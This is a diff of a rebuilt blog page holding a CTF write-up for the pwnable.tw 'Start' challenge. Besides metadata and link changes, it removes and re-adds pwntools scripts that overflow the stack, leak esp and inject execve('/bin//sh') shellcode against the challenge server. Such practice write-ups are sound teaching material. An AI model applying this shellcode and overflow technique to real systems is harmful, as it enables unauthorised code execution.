@@ -6,23 +6,23 @@
   <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <meta name="google-translate-customization" content="108d9124921d80c3-80e20d618ff053c8-g4f02ec6f3dba68b7-c">
-<!-- Begin Jekyll SEO tag v2.7.1 -->
+<!-- Begin Jekyll SEO tag v2.8.0 -->
 <title>Start - pwnable.tw | TourPran Blogs</title>
-<meta name="generator" content="Jekyll v4.2.0">
+<meta name="generator" content="Jekyll v4.3.3">
 <meta property="og:title" content="Start - pwnable.tw">
 <meta name="author" content="tourpran">
 <meta property="og:locale" content="en_US">
 <meta name="description" content="This is my blog for Binary Exploitation and Reverse Engineering.">
 <meta property="og:description" content="This is my blog for Binary Exploitation and Reverse Engineering.">
-<link rel="canonical" href="http://pranavkrish04.github.io/writeup/2020/04/29/pwnabletw1.html">
-<meta property="og:url" content="http://pranavkrish04.github.io/writeup/2020/04/29/pwnabletw1.html">
+<link rel="canonical" href="http://localhost:4000/writeup/2020/04/29/pwnabletw1.html">
+<meta property="og:url" content="http://localhost:4000/writeup/2020/04/29/pwnabletw1.html">
 <meta property="og:site_name" content="TourPran Blogs">
 <meta property="og:type" content="article">
 <meta property="article:published_time" content="2020-04-29T00:00:00+05:30">
 <meta name="twitter:card" content="summary">
 <meta property="twitter:title" content="Start - pwnable.tw">
 <script type="application/ld+json">
-{"@type":"BlogPosting","headline":"Start - pwnable.tw","url":"http://pranavkrish04.github.io/writeup/2020/04/29/pwnabletw1.html","datePublished":"2020-04-29T00:00:00+05:30","dateModified":"2020-04-29T00:00:00+05:30","mainEntityOfPage":{"@type":"WebPage","@id":"http://pranavkrish04.github.io/writeup/2020/04/29/pwnabletw1.html"},"author":{"@type":"Person","name":"tourpran"},"description":"This is my blog for Binary Exploitation and Reverse Engineering.","@context":"https://schema.org"}</script>
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"tourpran"},"dateModified":"2020-04-29T00:00:00+05:30","datePublished":"2020-04-29T00:00:00+05:30","description":"This is my blog for Binary Exploitation and Reverse Engineering.","headline":"Start - pwnable.tw","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/writeup/2020/04/29/pwnabletw1.html"},"url":"http://localhost:4000/writeup/2020/04/29/pwnabletw1.html"}</script>
 <!-- End Jekyll SEO tag -->
 <link rel="shortcut icon" href="">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
@@ -32,7 +32,7 @@
   <!-- and it's easy to individually load additional languages -->
   <script charset="UTF-8" src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.1.1/languages/go.min.js"></script>
   <link rel="stylesheet" href="/assets/css/main.css">
-  <script src="/assets/js/main.js"></script><link type="application/atom+xml" rel="alternate" href="http://pranavkrish04.github.io/feed.xml" title="TourPran Blogs">
+  <script src="/assets/js/main.js"></script><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="TourPran Blogs">
 </head>
 <body>
 
@@ -308,15 +308,15 @@ Also <code class="language-plaintext highlighter-rouge">INT 0x80</code> is equiv
   <li>We don’t have to worry about the shift of the stack because there is no PIE</li>
 </ul>
 
-<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'chall.pwnable.tw'</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">read</span><span class="p">())</span>
-<span class="n">buf</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">20</span>
-<span class="n">buf</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08048087</span><span class="p">)</span>
-<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
-<span class="n">esp</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">read</span><span class="p">()[:</span><span class="mi">4</span><span class="p">])</span>
-<span class="k">print</span> <span class="nb">hex</span><span class="p">(</span><span class="n">esp</span><span class="p">)</span>
-<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">chall.pwnable.tw</span><span class="sh">'</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">read</span><span class="p">())</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="mi">20</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x08048087</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+<span class="n">esp</span> <span class="o">=</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">read</span><span class="p">()[:</span><span class="mi">4</span><span class="p">])</span>
+<span class="k">print</span> <span class="nf">hex</span><span class="p">(</span><span class="n">esp</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
 
 </code></pre></div></div>
 
@@ -331,20 +331,20 @@ Also <code class="language-plaintext highlighter-rouge">INT 0x80</code> is equiv
 </ul>
 
 <div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
-<span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
-<span class="n">p</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'chall.pwnable.tw'</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)</span>
-<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">read</span><span class="p">())</span>
-<span class="n">buf</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mi">20</span>
-<span class="n">buf</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x08048087</span><span class="p">)</span>
-<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
-<span class="n">esp</span> <span class="o">=</span> <span class="n">unpack</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">read</span><span class="p">()[:</span><span class="mi">4</span><span class="p">])</span>
-<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="s">'</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span class="s">'</span>
+<span class="kn">from</span> <span class="n">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="n">p</span> <span class="o">=</span> <span class="nf">remote</span><span class="p">(</span><span class="sh">'</span><span class="s">chall.pwnable.tw</span><span class="sh">'</span><span class="p">,</span> <span class="mi">10000</span><span class="p">)</span>
+<span class="nf">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">read</span><span class="p">())</span>
+<span class="n">buf</span> <span class="o">=</span> <span class="sh">'</span><span class="s">A</span><span class="sh">'</span><span class="o">*</span><span class="mi">20</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="mh">0x08048087</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+<span class="n">esp</span> <span class="o">=</span> <span class="nf">unpack</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="nf">read</span><span class="p">()[:</span><span class="mi">4</span><span class="p">])</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="sa">b</span><span class="sh">'</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80</span><span class="sh">'</span>
 <span class="c1">#new exploit
-</span><span class="n">buf</span> <span class="o">=</span> <span class="s">'a'</span><span class="o">*</span><span class="mi">20</span>
-<span class="n">buf</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">esp</span><span class="o">+</span><span class="mi">20</span><span class="p">)</span>
+</span><span class="n">buf</span> <span class="o">=</span> <span class="sh">'</span><span class="s">a</span><span class="sh">'</span><span class="o">*</span><span class="mi">20</span>
+<span class="n">buf</span> <span class="o">+=</span> <span class="nf">p32</span><span class="p">(</span><span class="n">esp</span><span class="o">+</span><span class="mi">20</span><span class="p">)</span>
 <span class="n">buf</span> <span class="o">+=</span> <span class="n">shellcode</span>
-<span class="n">p</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
-<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="n">buf</span><span class="p">)</span>
+<span class="n">p</span><span class="p">.</span><span class="nf">interactive</span><span class="p">()</span>
 
 </code></pre></div></div>
 
@@ -362,29 +362,13 @@ Also <code class="language-plaintext highlighter-rouge">INT 0x80</code> is equiv
 <div class="post-related">
       <div>Related Articles</div>
       <ul>
-        <li><a class="post-link" href="/writeup/2020/04/30/pwnabletw2.html" title="ORW - pwnable.tw">ORW - pwnable.tw</a></li>
-<li><a class="post-link" href="/blogs/2021/03/27/sqlinjection.html" title="ORW - pwnable.tw">SQL Injection</a></li>
+        <li><a class="post-link" href="/writeup/2024/03/01/bi0sCTF-tallocator.html" title="ORW - pwnable.tw">tallocator - bi0sCTF24</a></li>
 <li><a class="post-link" href="/writeup/2021/12/30/inctfjquals.html" title="ORW - pwnable.tw">Leaky pipes - InCTFj Quals</a></li>
-<li><a class="post-link" href="/pwn-training/2022/01/20/checkpointpwn.html" title="ORW - pwnable.tw">Checkpoint</a></li>
+<li><a class="post-link" href="/blogs/2021/03/27/sqlinjection.html" title="ORW - pwnable.tw">[side quest] SQL Injection</a></li>
+<li><a class="post-link" href="/pwn-training/2022/01/20/checkpointpwn.html" title="ORW - pwnable.tw">[check] Checkpoint</a></li>
 </ul>
     </div>
-<div class="post-comments">
-<div id="disqus_thread"></div>
-<script>
-  var disqus_config = function () {
-    this.page.url = 'http://pranavkrish04.github.io/writeup/2020/04/29/pwnabletw1.html';
-    this.page.identifier = 'http://pranavkrish04.github.io/writeup/2020/04/29/pwnabletw1.html';
-  };
-  (function() {
-    var d = document, s = d.createElement('script');
-    s.src = 'https://tourpran.disqus.com/embed.js';
-    s.setAttribute('data-timestamp', +new Date());
-    (d.head || d.body).appendChild(s);
-  })();
-</script>
-<noscript>Please enable JavaScript to view the <a href="https://disqus.com/?ref_noscript" rel="nofollow">comments powered by Disqus.</a>
-</noscript>
-</div></section>
+<div class="post-comments"></div></section>
 </div>
 
 
